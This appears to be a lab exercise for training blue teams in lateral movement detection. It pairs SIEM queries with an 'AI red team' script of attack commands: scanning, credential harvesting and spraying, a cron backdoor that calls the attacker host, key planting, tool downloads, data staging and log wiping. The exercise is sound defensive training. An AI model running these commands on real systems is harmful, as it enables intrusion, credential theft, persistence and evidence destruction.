# Lateral Movement Attack Chain

**Exercise ID**: INT-001  
**MITRE ATT&CK Tactics**: Lateral Movement (TA0008), Credential Access (TA0006), Discovery (TA0007)  
**Difficulty**: 🟡 Intermediate  
**Duration**: 4-6 hours  

## Overview & Learning Objectives

This exercise simulates a realistic lateral movement scenario where an attacker pivots from an initially compromised host to other systems in the network. Blue teams will learn to detect and respond to sophisticated multi-host attack patterns.

**Learning Outcomes:**

- Detect credential harvesting and lateral movement techniques
- Understand attack progression across network boundaries
- Build correlated detection rules spanning multiple hosts
- Practice incident response for advanced persistent threats

**Target MITRE ATT&CK Techniques:**

- T1078.003: Valid Accounts - Local Accounts
- T1021.004: Remote Services - SSH
- T1003.001: OS Credential Dumping - LSASS Memory
- T1055: Process Injection
- T1027: Obfuscated Files or Information
- T1070.004: Indicator Removal - File Deletion

## Infrastructure Requirements

- **Minimum Setup**: 3 machines (1 Kali, 2 victim hosts)
- **Recommended Setup**: 4-5 machines with mixed OS (Linux/Windows)
- **Network**: Segmented subnets to simulate real enterprise network
- **Services**: SSH, RDP, SMB shares configured between hosts
- **Monitoring**: Enhanced logging on all victim machines
- **Permissions**: Different privilege levels across machines

## Setup Instructions (for Blue Team)

### Network Topology

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│    Kali     │    │  Victim-1   │    │  Victim-2   │
│ (Attacker)  │────│  (Initial)  │────│  (Target)   │
│ 10.0.1.10   │    │ 10.0.1.20   │    │ 10.0.1.30   │
└─────────────┘    └─────────────┘    └─────────────┘
                           │
                   ┌─────────────┐
                   │  Victim-3   │
                   │  (Domain)   │
                   │ 10.0.1.40   │
                   └─────────────┘
```

### Pre-Exercise Configuration

1. **Enhanced Logging Setup**

   ```bash
   # On all victim machines - enable comprehensive logging
   
   # Linux hosts
   sudo auditctl -w /etc/passwd -p wa -k user_modification
   sudo auditctl -w /etc/shadow -p wa -k password_access
   sudo auditctl -w /tmp -p wa -k tmp_activity
   sudo auditctl -w /var/log -p wa -k log_access
   
   # Monitor SSH activity
   sudo auditctl -a exit,always -F arch=b64 -S connect -k network_connect
   sudo auditctl -a exit,always -F arch=b64 -S execve -k command_execution
   ```

2. **Create Realistic Environment**

   ```bash
   # Add users with shared credentials (simulate poor security practices)
   sudo useradd -m service_account
   echo 'service_account:Password123!' | sudo chpasswd
   
   # Add SSH keys for lateral movement
   sudo mkdir -p /home/service_account/.ssh
   sudo ssh-keygen -t rsa -b 2048 -f /tmp/lateral_key -N ""
   sudo cp /tmp/lateral_key.pub /home/service_account/.ssh/authorized_keys
   sudo chown -R service_account:service_account /home/service_account/.ssh
   sudo chmod 700 /home/service_account/.ssh
   sudo chmod 600 /home/service_account/.ssh/authorized_keys
   
   # Create shared files with credentials
   echo "backup_server_password=BackupPass456!" | sudo tee /opt/config.txt
   sudo chmod 644 /opt/config.txt
   ```

3. **SIEM Correlation Setup**
   - Configure cross-host log correlation
   - Set up network-based detection rules
   - Create lateral movement alert categories

### SIEM Query Examples

**Splunk - Lateral Movement Detection:**

```splunk
index=main 
| eval time_window=_time
| transaction maxspan=10m host,user startswith="ssh" endswith="sudo"
| where eventcount > 3
| eval lateral_movement_score=case(
    like(host,"%victim-1%") AND like(host,"%victim-2%"), 100,
    eventcount > 5, 80,
    1=1, 60
)
| where lateral_movement_score > 70
| table _time, host, user, lateral_movement_score, eventcount
```

**qRadar - Credential Access Pattern:**

```sql
SELECT 
    sourceip,
    destinationip,
    username,
    "Event Name",
    COUNT(*) as event_count,
    starttime
FROM events
WHERE 
    (payload ilike '%ssh%' OR 
     payload ilike '%scp%' OR
     payload ilike '%sudo%' OR
     payload ilike '%su -%')
    AND starttime > NOW() - INTERVAL '6 HOURS'
GROUP BY sourceip, destinationip, username, "Event Name", starttime
HAVING COUNT(*) > 3
ORDER BY event_count DESC
```

## Red Team AI Instructions

**Context**: You are an advanced AI red team operator simulating an APT group conducting lateral movement. You have initial access to `victim-1` (10.0.1.20) and must pivot to other systems. Use realistic TTPs and maintain operational security while generating detectable indicators.

### Phase 1: Initial Enumeration and Credential Harvesting (T1003, T1082)

**Objective**: Establish situational awareness and harvest credentials for lateral movement.

1. **Network Discovery:**

   ```bash
   # Initial reconnaissance
   ip route show
   arp -a
   cat /etc/hosts
   
   # Network scanning for potential targets
   nmap -sn 10.0.1.0/24
   nmap -sT -p 22,3389,445,5985 10.0.1.0/24
   ```

2. **Credential Harvesting:**

   ```bash
   # Search for credential files
   find /home -name "*.txt" -o -name "*.conf" -o -name "*.cfg" 2>/dev/null | head -20
   find /opt -name "*config*" -o -name "*password*" 2>/dev/null
   grep -r "password\|pass\|pwd" /opt/ 2>/dev/null
   
   # Check SSH keys and configuration
   find /home -name "authorized_keys" -o -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
   ls -la ~/.ssh/
   cat ~/.ssh/config 2>/dev/null
   ```

3. **Memory-based Credential Extraction:**

   ```bash
   # Simulate credential dumping (safe methods for lab)
   ps aux | grep -E "(ssh|sudo|su)"
   cat /proc/*/environ 2>/dev/null | grep -E "PASS|TOKEN" | head -5
   
   # Check for stored credentials
   cat /opt/config.txt
   grep -r "service_account" /etc/passwd /home/ 2>/dev/null
   ```

### Phase 2: Lateral Movement Preparation (T1021.004, T1078.003)

**Objective**: Prepare for movement to secondary targets using discovered credentials.

1. **SSH Key Preparation:**

   ```bash
   # Copy discovered SSH keys
   cp /tmp/lateral_key /tmp/.ssh_key
   chmod 600 /tmp/.ssh_key
   
   # Test SSH connectivity
   ssh -i /tmp/.ssh_key -o ConnectTimeout=5 service_account@10.0.1.30 "echo 'Connection test'"
   ssh -i /tmp/.ssh_key -o ConnectTimeout=5 service_account@10.0.1.40 "echo 'Connection test'"
   ```

2. **Credential Validation:**

   ```bash
   # Test discovered passwords
   sshpass -p 'Password123!' ssh service_account@10.0.1.30 "whoami"
   sshpass -p 'BackupPass456!' ssh backup@10.0.1.40 "whoami" 2>/dev/null || echo "Backup creds failed"
   ```

3. **Establish Persistence Before Movement:**

   ```bash
   # Create backdoor for return access
   echo "*/10 * * * * /bin/bash -c 'curl -s http://10.0.1.10:8080/heartbeat || true'" | crontab -
   
   # Plant SSH key for persistent access
   mkdir -p ~/.ssh
   echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ... attacker@kali" >> ~/.ssh/authorized_keys
   ```

### Phase 3: Lateral Movement Execution (T1021.004, T1055)

**Objective**: Move laterally to victim-2 and establish operational capabilities.

1. **Initial Lateral Movement:**

   ```bash
   # Connect to victim-2 using SSH
   ssh -i /tmp/.ssh_key service_account@10.0.1.30
   
   # Once connected to victim-2, execute discovery
   hostname && whoami && id
   uname -a
   ps aux | head -10
   netstat -tulpn | head -10
   ```

2. **Establish Foothold on Victim-2:**

   ```bash
   # Create working directory
   mkdir -p /tmp/.system_update
   cd /tmp/.system_update
   
   # Download additional tools (simulate)
   echo '#!/bin/bash
   curl -s http://10.0.1.10:8080/tools/scanner > /tmp/.system_update/scan.sh
   curl -s http://10.0.1.10:8080/tools/privilege > /tmp/.system_update/priv.sh
   chmod +x /tmp/.system_update/*.sh' > /tmp/.system_update/download.sh
   chmod +x /tmp/.system_update/download.sh
   ```

3. **Process Injection Simulation:**

   ```bash
   # Simulate process hollowing/injection
   echo '#!/bin/bash
   target_pid=$(pgrep systemd | head -1)
   echo "Injecting into PID: $target_pid"
   echo "$(date): Process injection simulation" >> /tmp/.injection_log' > /tmp/.inject.sh
   chmod +x /tmp/.inject.sh
   /tmp/.inject.sh
   ```

### Phase 4: Privilege Escalation and Further Movement (T1068, T1021.002)

**Objective**: Escalate privileges and move to additional targets.

1. **Privilege Escalation Attempts:**

   ```bash
   # Check for sudo privileges
   sudo -l
   
   # Look for SUID binaries
   find / -perm -4000 -type f 2>/dev/null | head -10
   
   # Check for vulnerable services
   systemctl list-units --type=service --state=running | grep -E "(apache|nginx|mysql)"
   ```

2. **Move to Domain Controller (Victim-3):**

   ```bash
   # Test connectivity to victim-3
   ping -c 3 10.0.1.40
   
   # Attempt SMB enumeration
   smbclient -L //10.0.1.40 -N 2>/dev/null
   
   # Try credential spraying
   for user in admin administrator root; do
       sshpass -p 'Password123!' ssh $user@10.0.1.40 "whoami" 2>/dev/null && echo "Success: $user"
   done
   ```

3. **Data Exfiltration Preparation:**

   ```bash
   # Identify sensitive data
   find /home -name "*confidential*" -o -name "*secret*" -o -name "*.key" 2>/dev/null
   find /opt -name "*.db" -o -name "*.sql" 2>/dev/null
   
   # Stage data for exfiltration
   mkdir -p /tmp/.exfil
   cp /etc/passwd /tmp/.exfil/system_users.txt
   cp /home/service_account/.bash_history /tmp/.exfil/command_history.txt 2>/dev/null
   ```

### Phase 5: Anti-Forensics and Cleanup (T1070.004, T1027)

**Objective**: Cover tracks and maintain persistent access.

1. **Log Tampering:**

   ```bash
   # Clear command history
   history -c
   echo "" > ~/.bash_history
   
   # Modify log files (if writable)
   echo "" > /var/log/auth.log 2>/dev/null || echo "Cannot modify auth.log"
   
   # Remove obvious artifacts
   rm -f /tmp/.ssh_key /tmp/.inject.sh
   ```

2. **Obfuscation Techniques:**

   ```bash
   # Rename malicious files to look legitimate
   mv /tmp/.system_update /tmp/apt-cache-update
   
   # Create decoy files
   echo "# System configuration backup" > /tmp/system_backup.conf
   echo "backup_schedule=daily" >> /tmp/system_backup.conf
   ```

### Expected AI Behavior

- **Maintain realistic timing** (2-5 minutes between major phases)
- **Document all successful lateral movements** with target IP and credentials used
- **Note any failed attempts** and the reason for failure
- **Provide IOCs** for each phase of the attack

## Detection Scenarios

### Scenario 1: Initial Compromise Recognition

**Expected Timeline**: 0-30 minutes
**What Blue Team Should See**: Unusual authentication patterns and network scanning

**Detection Points:**

- SSH connections from unexpected source
- Network scanning activities
- File access to credential stores
- Process execution anomalies

### Scenario 2: Credential Harvesting Alert  

**Expected Timeline**: 30-60 minutes
**What Blue Team Should See**: Suspicious file access and credential-related activities

**Detection Points:**

- Access to SSH key files
- Reading of configuration files containing passwords
- Memory dumping activities
- Unusual process inspection

### Scenario 3: Lateral Movement Detection

**Expected Timeline**: 60-120 minutes  
**What Blue Team Should See**: Cross-host authentication events and new connections

**Detection Points:**

- SSH connections between internal hosts
- Same account authenticating from multiple IPs
- New SSH sessions from compromised hosts
- Process creation on multiple systems

### Scenario 4: Persistence and Privilege Escalation

**Expected Timeline**: 120-180 minutes
**What Blue Team Should See**: Escalation attempts and persistence mechanisms

**Detection Points:**

- Sudo attempts and privilege escalation
- Cron job creation
- SSH key additions
- Service enumeration activities

## Expected Outcomes

### Blue Team Success Metrics

- **Cross-host Correlation**: Successfully link activities across victim machines
- **Timeline Reconstruction**: Build accurate attack timeline
- **Containment**: Identify and isolate compromised systems
- **Impact Assessment**: Determine scope of compromise

### Advanced Detection Opportunities

1. **Behavioral Analytics**: Unusual authentication patterns
2. **Network Monitoring**: East-west traffic analysis  
3. **Credential Monitoring**: Privileged account usage tracking
4. **Memory Forensics**: Process injection detection

### Common Blind Spots

- **Encrypted Communications**: SSH tunneling and encrypted channels
- **Living off the Land**: Use of legitimate system tools
- **Slow and Low**: Extended attack timelines
- **Credential Reuse**: Valid account usage across systems

## Cleanup & Lessons Learned

### Comprehensive Cleanup

```bash
# On each victim machine
sudo userdel service_account
sudo rm -rf /tmp/.system_update /tmp/apt-cache-update /tmp/.exfil
sudo rm -f /tmp/.ssh_key /tmp/.inject.sh /tmp/system_backup.conf
crontab -r
sudo sed -i '/heartbeat/d' /var/spool/cron/crontabs/* 2>/dev/null
```

### Critical Discussion Points

- How effective was cross-host event correlation?
- What legitimate activities might generate similar patterns?
- Which phase of the attack was most difficult to detect?
- How can detection be improved without impacting performance?

### Capability Improvements

1. **Network Segmentation**: Implement micro-segmentation
2. **Privileged Access Management**: Better credential controls
3. **Endpoint Detection**: Enhanced EDR deployment
4. **User Behavior Analytics**: Baseline establishment

### Next Exercise Progression

- **INT-002: Advanced Persistence and C2** - Advanced command and control
- **EXP-001: Zero-Day Simulation** - Custom exploit development
- **INT-003: Cloud Lateral Movement** - Multi-cloud attack chains

---

**Exercise Notes:**

- This exercise requires careful coordination between multiple systems
- Network connectivity between all hosts is essential
- Consider using VM snapshots for rapid environment reset
- Excellent preparation for real-world incident response scenarios
